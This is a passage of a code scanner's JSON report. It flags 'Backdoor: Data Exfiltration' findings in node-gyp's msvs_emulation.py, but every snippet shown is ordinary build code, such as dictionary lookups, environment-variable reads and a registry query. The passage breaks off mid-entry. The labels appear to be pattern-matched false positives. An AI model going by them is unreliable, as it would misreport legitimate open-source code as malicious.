            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 259,
                  "startColumn": 31,
                  "endLine": 259,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        equivalents.\"\"\"\n        target_arch = self.GetArch(config)\n        target_platform = \"Win32\" if target_arch == \"x86\" else target_arch\n        target_name = self.spec.get(\"product_prefix\", \"\") + self.spec.get(\n            \"product_name\", self.spec[\"target_name\"]\n        )\n        target_dir = base_to_build + \"\\\\\" if base_to_build else \"\"\n",
                    "rendered": {
                      "text": "        equivalents.\"\"\"\n        target_arch = self.GetArch(config)\n        target_platform = \"Win32\" if target_arch == \"x86\" else target_arch\n        target_name = self.spec.get(\"product_prefix\", \"\") + self.spec.get(\n            \"product_name\", self.spec[\"target_name\"]\n        )\n        target_dir = base_to_build + \"\\\\\" if base_to_build else \"\"\n",
                      "markdown": "`        equivalents.\"\"\"\n        target_arch = self.GetArch(config)\n        target_platform = \"Win32\" if target_arch == \"x86\" else target_arch\n        target_name = self.spec.get(\"product_prefix\", \"\") + self.spec.get(\n            \"product_name\", self.spec[\"target_name\"]\n        )\n        target_dir = base_to_build + \"\\\\\" if base_to_build else \"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 252,
                  "startColumn": 43,
                  "endLine": 252,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        ext = self.spec.get(\"product_extension\", None)\n        if ext:\n            return ext\n        return gyp.MSVSUtil.TARGET_TYPE_EXT.get(self.spec[\"type\"], \"\")\n\n    def GetVSMacroEnv(self, base_to_build=None, config=None):\n        \"\"\"Get a dict of variables mapping internal VS macro names to their gyp\n",
                    "rendered": {
                      "text": "        ext = self.spec.get(\"product_extension\", None)\n        if ext:\n            return ext\n        return gyp.MSVSUtil.TARGET_TYPE_EXT.get(self.spec[\"type\"], \"\")\n\n    def GetVSMacroEnv(self, base_to_build=None, config=None):\n        \"\"\"Get a dict of variables mapping internal VS macro names to their gyp\n",
                      "markdown": "`        ext = self.spec.get(\"product_extension\", None)\n        if ext:\n            return ext\n        return gyp.MSVSUtil.TARGET_TYPE_EXT.get(self.spec[\"type\"], \"\")\n\n    def GetVSMacroEnv(self, base_to_build=None, config=None):\n        \"\"\"Get a dict of variables mapping internal VS macro names to their gyp\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 249,
                  "startColumn": 23,
                  "endLine": 249,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        Uses 'product_extension' if specified, otherwise uses MSVS defaults based on\n        the target type.\n        \"\"\"\n        ext = self.spec.get(\"product_extension\", None)\n        if ext:\n            return ext\n        return gyp.MSVSUtil.TARGET_TYPE_EXT.get(self.spec[\"type\"], \"\")\n",
                    "rendered": {
                      "text": "        Uses 'product_extension' if specified, otherwise uses MSVS defaults based on\n        the target type.\n        \"\"\"\n        ext = self.spec.get(\"product_extension\", None)\n        if ext:\n            return ext\n        return gyp.MSVSUtil.TARGET_TYPE_EXT.get(self.spec[\"type\"], \"\")\n",
                      "markdown": "`        Uses 'product_extension' if specified, otherwise uses MSVS defaults based on\n        the target type.\n        \"\"\"\n        ext = self.spec.get(\"product_extension\", None)\n        if ext:\n            return ext\n        return gyp.MSVSUtil.TARGET_TYPE_EXT.get(self.spec[\"type\"], \"\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 225,
                  "startColumn": 36,
                  "endLine": 225,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            for configname, config in configs.items():\n                getattr(self, field)[configname] = config.get(field, default())\n\n        self.msvs_cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])\n\n        unsupported_fields = [\n            \"msvs_prebuild\",\n",
                    "rendered": {
                      "text": "            for configname, config in configs.items():\n                getattr(self, field)[configname] = config.get(field, default())\n\n        self.msvs_cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])\n\n        unsupported_fields = [\n            \"msvs_prebuild\",\n",
                      "markdown": "`            for configname, config in configs.items():\n                getattr(self, field)[configname] = config.get(field, default())\n\n        self.msvs_cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])\n\n        unsupported_fields = [\n            \"msvs_prebuild\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 223,
                  "startColumn": 57,
                  "endLine": 223,
                  "endColumn": 62,
                  "snippet": {
                    "text": "        for field, default in supported_fields:\n            setattr(self, field, {})\n            for configname, config in configs.items():\n                getattr(self, field)[configname] = config.get(field, default())\n\n        self.msvs_cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])\n\n",
                    "rendered": {
                      "text": "        for field, default in supported_fields:\n            setattr(self, field, {})\n            for configname, config in configs.items():\n                getattr(self, field)[configname] = config.get(field, default())\n\n        self.msvs_cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])\n\n",
                      "markdown": "`        for field, default in supported_fields:\n            setattr(self, field, {})\n            for configname, config in configs.items():\n                getattr(self, field)[configname] = config.get(field, default())\n\n        self.msvs_cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 192,
                  "startColumn": 25,
                  "endLine": 192,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n    # Remove system includes shared by all targets from the targets.\n    for config in configs:\n        includes = config.get(\"msvs_system_include_dirs\", [])\n        if includes:  # Don't insert a msvs_system_include_dirs key if not needed.\n            # This must check the unexpanded includes list:\n            new_includes = [i for i in includes if i not in all_system_includes]\n",
                    "rendered": {
                      "text": "\n    # Remove system includes shared by all targets from the targets.\n    for config in configs:\n        includes = config.get(\"msvs_system_include_dirs\", [])\n        if includes:  # Don't insert a msvs_system_include_dirs key if not needed.\n            # This must check the unexpanded includes list:\n            new_includes = [i for i in includes if i not in all_system_includes]\n",
                      "markdown": "`\n    # Remove system includes shared by all targets from the targets.\n    for config in configs:\n        includes = config.get(\"msvs_system_include_dirs\", [])\n        if includes:  # Don't insert a msvs_system_include_dirs key if not needed.\n            # This must check the unexpanded includes list:\n            new_includes = [i for i in includes if i not in all_system_includes]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 32,
                  "endLine": 177,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    them from all targets, and returns an OrderedSet containing them.\"\"\"\n    all_system_includes = OrderedSet(configs[0].get(\"msvs_system_include_dirs\", []))\n    for config in configs[1:]:\n        system_includes = config.get(\"msvs_system_include_dirs\", [])\n        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n",
                    "rendered": {
                      "text": "    them from all targets, and returns an OrderedSet containing them.\"\"\"\n    all_system_includes = OrderedSet(configs[0].get(\"msvs_system_include_dirs\", []))\n    for config in configs[1:]:\n        system_includes = config.get(\"msvs_system_include_dirs\", [])\n        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n",
                      "markdown": "`    them from all targets, and returns an OrderedSet containing them.\"\"\"\n    all_system_includes = OrderedSet(configs[0].get(\"msvs_system_include_dirs\", []))\n    for config in configs[1:]:\n        system_includes = config.get(\"msvs_system_include_dirs\", [])\n        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 175,
                  "startColumn": 47,
                  "endLine": 175,
                  "endColumn": 52,
                  "snippet": {
                    "text": "def ExtractSharedMSVSSystemIncludes(configs, generator_flags):\n    \"\"\"Finds msvs_system_include_dirs that are common to all targets, removes\n    them from all targets, and returns an OrderedSet containing them.\"\"\"\n    all_system_includes = OrderedSet(configs[0].get(\"msvs_system_include_dirs\", []))\n    for config in configs[1:]:\n        system_includes = config.get(\"msvs_system_include_dirs\", [])\n        all_system_includes = all_system_includes & OrderedSet(system_includes)\n",
                    "rendered": {
                      "text": "def ExtractSharedMSVSSystemIncludes(configs, generator_flags):\n    \"\"\"Finds msvs_system_include_dirs that are common to all targets, removes\n    them from all targets, and returns an OrderedSet containing them.\"\"\"\n    all_system_includes = OrderedSet(configs[0].get(\"msvs_system_include_dirs\", []))\n    for config in configs[1:]:\n        system_includes = config.get(\"msvs_system_include_dirs\", [])\n        all_system_includes = all_system_includes & OrderedSet(system_includes)\n",
                      "markdown": "`def ExtractSharedMSVSSystemIncludes(configs, generator_flags):\n    \"\"\"Finds msvs_system_include_dirs that are common to all targets, removes\n    them from all targets, and returns an OrderedSet containing them.\"\"\"\n    all_system_includes = OrderedSet(configs[0].get(\"msvs_system_include_dirs\", []))\n    for config in configs[1:]:\n        system_includes = config.get(\"msvs_system_include_dirs\", [])\n        all_system_includes = all_system_includes & OrderedSet(system_includes)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 34,
                  "endLine": 168,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\n",
                    "rendered": {
                      "text": "    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\n",
                      "markdown": "`    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 26,
                  "endLine": 136,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n\n    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n",
                    "rendered": {
                      "text": "    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n\n    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n",
                      "markdown": "`    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n\n    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 88,
                  "startColumn": 32,
                  "endLine": 88,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        return default\n    if not path:\n        return root\n    return _GenericRetrieve(root.get(path[0]), default, path[1:])\n\n\ndef _AddPrefix(element, prefix):\n",
                    "rendered": {
                      "text": "        return default\n    if not path:\n        return root\n    return _GenericRetrieve(root.get(path[0]), default, path[1:])\n\n\ndef _AddPrefix(element, prefix):\n",
                      "markdown": "`        return default\n    if not path:\n        return root\n    return _GenericRetrieve(root.get(path[0]), default, path[1:])\n\n\ndef _AddPrefix(element, prefix):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1255,
                  "startColumn": 74,
                  "endLine": 1255,
                  "endColumn": 85,
                  "snippet": {
                    "text": "    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                    "rendered": {
                      "text": "    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                      "markdown": "`    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1255,
                  "startColumn": 18,
                  "endLine": 1255,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                    "rendered": {
                      "text": "    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                      "markdown": "`    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1207,
                  "startColumn": 12,
                  "endLine": 1207,
                  "endColumn": 48,
                  "snippet": {
                    "text": "            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n        env_block = _FormatAsEnvironmentBlock(env)\n        f = open_out(os.path.join(toplevel_build_dir, \"environment.\" + arch), \"w\")\n",
                    "rendered": {
                      "text": "            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n        env_block = _FormatAsEnvironmentBlock(env)\n        f = open_out(os.path.join(toplevel_build_dir, \"environment.\" + arch), \"w\")\n",
                      "markdown": "`            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n        env_block = _FormatAsEnvironmentBlock(env)\n        f = open_out(os.path.join(toplevel_build_dir, \"environment.\" + arch), \"w\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1205,
                  "startColumn": 16,
                  "endLine": 1205,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n",
                    "rendered": {
                      "text": "        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n",
                      "markdown": "`        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1172,
                  "startColumn": 46,
                  "endLine": 1172,
                  "endColumn": 72,
                  "snippet": {
                    "text": "    etc. on Windows, as those tools rely on .dlls being in the PATH. We also\n    need to support both x86 and x64 compilers within the same build (to support\n    msvs_target_platform hackery). Different architectures require a different\n    compiler binary, and different supporting environment variables (INCLUDE,\n    LIB, LIBPATH). So, we extract the environment here, wrap all invocations\n    of compiler tools (cl, link, lib, rc, midl, etc.) via win_tool.py which\n    sets up the environment, and then we do not prefix the compiler with\n",
                    "rendered": {
                      "text": "    etc. on Windows, as those tools rely on .dlls being in the PATH. We also\n    need to support both x86 and x64 compilers within the same build (to support\n    msvs_target_platform hackery). Different architectures require a different\n    compiler binary, and different supporting environment variables (INCLUDE,\n    LIB, LIBPATH). So, we extract the environment here, wrap all invocations\n    of compiler tools (cl, link, lib, rc, midl, etc.) via win_tool.py which\n    sets up the environment, and then we do not prefix the compiler with\n",
                      "markdown": "`    etc. on Windows, as those tools rely on .dlls being in the PATH. We also\n    need to support both x86 and x64 compilers within the same build (to support\n    msvs_target_platform hackery). Different architectures require a different\n    compiler binary, and different supporting environment variables (INCLUDE,\n    LIB, LIBPATH). So, we extract the environment here, wrap all invocations\n    of compiler tools (cl, link, lib, rc, midl, etc.) via win_tool.py which\n    sets up the environment, and then we do not prefix the compiler with\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1004,
                  "startColumn": 38,
                  "endLine": 1004,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        target_platform = self.GetArch(config)\n        if target_platform == \"x86\":\n            target_platform = \"win32\"\n        flags = [\"/char\", \"signed\", \"/env\", target_platform, \"/Oicf\"]\n        return outdir, output, variables, flags\n\n\n",
                    "rendered": {
                      "text": "        target_platform = self.GetArch(config)\n        if target_platform == \"x86\":\n            target_platform = \"win32\"\n        flags = [\"/char\", \"signed\", \"/env\", target_platform, \"/Oicf\"]\n        return outdir, output, variables, flags\n\n\n",
                      "markdown": "`        target_platform = self.GetArch(config)\n        if target_platform == \"x86\":\n            target_platform = \"win32\"\n        flags = [\"/char\", \"signed\", \"/env\", target_platform, \"/Oicf\"]\n        return outdir, output, variables, flags\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 285,
                  "startColumn": 8,
                  "endLine": 285,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n    def ConvertVSMacros(self, s, base_to_build=None, config=None):\n        \"\"\"Convert from VS macro names to something equivalent.\"\"\"\n        env = self.GetVSMacroEnv(base_to_build, config=config)\n        return ExpandMacros(s, env)\n\n    def AdjustLibraries(self, libraries):\n",
                    "rendered": {
                      "text": "\n    def ConvertVSMacros(self, s, base_to_build=None, config=None):\n        \"\"\"Convert from VS macro names to something equivalent.\"\"\"\n        env = self.GetVSMacroEnv(base_to_build, config=config)\n        return ExpandMacros(s, env)\n\n    def AdjustLibraries(self, libraries):\n",
                      "markdown": "`\n    def ConvertVSMacros(self, s, base_to_build=None, config=None):\n        \"\"\"Convert from VS macro names to something equivalent.\"\"\"\n        env = self.GetVSMacroEnv(base_to_build, config=config)\n        return ExpandMacros(s, env)\n\n    def AdjustLibraries(self, libraries):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 184,
                  "startColumn": 31,
                  "endLine": 184,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n    if any(\"$\" in include for include in expanded_system_includes):\n        # Some path relies on target-specific variables, bail.\n",
                    "rendered": {
                      "text": "    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n    if any(\"$\" in include for include in expanded_system_includes):\n        # Some path relies on target-specific variables, bail.\n",
                      "markdown": "`    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n    if any(\"$\" in include for include in expanded_system_includes):\n        # Some path relies on target-specific variables, bail.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
